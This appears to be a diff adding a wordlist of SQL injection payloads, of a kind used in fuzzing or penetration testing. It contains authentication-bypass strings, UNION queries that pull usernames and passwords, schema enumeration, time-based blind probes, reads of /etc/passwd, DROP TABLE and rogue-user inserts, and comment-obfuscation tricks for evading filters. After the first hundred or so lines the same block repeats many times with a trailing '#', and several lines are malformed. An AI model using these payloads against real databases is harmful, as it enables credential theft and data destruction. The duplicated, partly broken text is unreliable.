@@ -1,0 +1,828 @@
+' OR 1=1--
+' OR '1'='1
+' UNION SELECT null, null--
+' UNION SELECT 1, @@version--
+' UNION SELECT 1, table_name FROM information_schema.tables--
+' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM users--
+' AND SLEEP(5)--
+'; DROP TABLE users--
+' OR 1=1 LIMIT 1--
+' ORDER BY 1--
+' ORDER BY 3--
+' AND (SELECT COUNT(*) FROM users) > 0--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 65--
+' UNION SELECT 1, LOAD_FILE('/etc/passwd')--
+' UNION SELECT 1, user()--
+' UNION SELECT 1, database()--
+' AND 1=IF(1=1, SLEEP(3), 0)--
+' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()�
+DROP sampletable;--
+DROP sampletable:#
+admin'--
+SELECT * FROM members WHERE name = 'admin'--' AND password = 'password'
+DROP/*comment*/sampletable
+DR/**/OP/*bypass blacklisting*/sampletable
+SELECT/**/password/**/FROM/**/Members
+1; DROP TABLE members /*
+SELECT /*!090100 1/0, */ 1 FROM tablename
+/* 090100 10*/
+SELECT /* 090100 1/0, */ 1 FROM tablename
+1;DRO MEMBERS --
+SELECT * FROM products WHERE id = 10; DROP members--
+SELECT if(1=1,'true','false')
+IF (1=1) SELECT 'true' ELSE SELECT 'false'
+IF (1=1) THEN DBMS_LOCK.sleep(3); ELSE DBMS_LOCK.sleep(0); END IF; END; 
+SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END;
+SELECT iif(1<2, 'True', 'False');
+if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0
+SELECT CHAR(0x66)
+SELECT 0x5045
+SELECT 0x50 + 0x45
+' OR 0x20 + 0x10 = 0x30 -- -
+SELECT login + '-' + password FROM members
+SELECT login || '-' || password FROM members
+SELECT CONCAT(login, password) FROM members
+SELECT 0x45758
+SELECT CONCAT('0x',HEX('c:\pboot.ini'))
+SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))
+SELECT CHAR(75)+CHAR(76)+CHAR(77)
+SELECT CHR(75)||CHR(76)||CHR(77)
+SELECT (CHaR(75)||CHaR(76)||CHaR(77))
+SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
+SELECT ASCII('A')
+SELECT CHAR(64)
+SELECT CHR(64)
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members
+' UNION SELECT 1, 'anotheruser', 'any string', 1--
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('z' = 'z--
+' UNION SELECT 1, 'anotheruser', 'any string', 1--
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
+' HAVING 1=1 --
+' GROUP BY table.columnfromerror1 HAVING 1=1 --
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY N--
+' UNION SELECT sum(columntofind) from users--
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null--
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –-
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –-
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 --
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –-
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –-
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*
+@@version
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)
+UNION SELECT null, version(), null;
+UNION SELECT null, sqlite_version(),null;
+SELECT char(64)
+SELECT CHR(64)
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
